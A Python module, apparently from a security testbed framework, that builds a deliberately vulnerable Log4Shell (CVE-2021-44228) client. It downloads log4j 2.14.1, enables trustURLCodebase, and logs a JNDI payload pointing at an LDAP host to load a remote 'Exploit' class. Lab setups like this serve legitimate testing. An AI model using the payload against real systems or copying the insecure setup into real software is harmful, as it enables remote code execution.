import os, sys, logging
import pathlib
fpath = pathlib.Path(__file__).parent.resolve()
root_directory = os.path.abspath("{}/..".format(fpath))
from applications.application import Application

class Cve202144228VulnerableClient(Application):
    def __init__(self, app, **params):
        name = params.get("name", app)
        super().__init__(app, name)

    # Please revise the following functions if it is different
    # from the default way
    def check_application(self, arch=None, os=None):
        logging.debug("Check the application: {}".format(self.app))
        cmds = []
        # if arch == "aarch64" and os == "debian":
        #     cmd = "which nmap"
        #     cmds.append(cmd)
        return cmds

    def prepare_application(self, arch=None, os=None):
        logging.debug("Prepare the application: {}".format(self.app))
        cmds = []

        cmd = "apt-get install -y curl"
        cmds.append(cmd)

        cmd = "curl -O https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar"
        cmds.append(cmd)

        cmd = "curl -O https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar"
        cmds.append(cmd)

        cmd = "cat <<EOF > VulnerableClient.java\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class VulnerableClient {\n\tprivate static final Logger logger = LogManager.getLogger(VulnerableClient.class);\n\n\tpublic static void main(String[] args) {\n\t\tSystem.out.println(\"Starting VulnerableClient...\");\n\t\ttry {\n\t\t\t// Set the system property to trust remote codebases\n\t\t\tSystem.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\");\n\t\t\tSystem.out.println(\"Checking property value: \" + System.getProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\"));\n\n\t\t\t// Log some basic info and attempt the JNDI lookup\n\t\t\tSystem.out.println(\"Attempting JNDI lookup...\");\n\t\t\tlogger.error(\"Java Version->>\" + \"\${java:version}\");\n\t\t\tlogger.error(\"\${jndi:ldap://ldap-server:1389/Exploit}\");\n\t\t\tSystem.out.println(\"JNDI lookup attempted.\");\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n}\nEOF"
        cmds.append(cmd)

        cmd = "javac -cp \"log4j-core-2.14.1.jar:log4j-api-2.14.1.jar\" VulnerableClient.java"
        cmds.append(cmd)

        # if arch == "aarch64" and os == "debian":
        #     cmd = "apt-get install nmap"
        #     cmds.append(cmd)
        return cmds

    def run_application(self, arch=None, os=None, **params):
        logging.debug("Run the application: {}".format(self.app))
        cmds = []

        cmd = "java -cp \".:log4j-core-2.14.1.jar:log4j-api-2.14.1.jar\" VulnerableClient"
        cmds.append(cmd)
        # if arch == "aarch64" and os == "debian":
        #     cmd = "nmap"
        #     cmds.append(cmd)
        return cmds

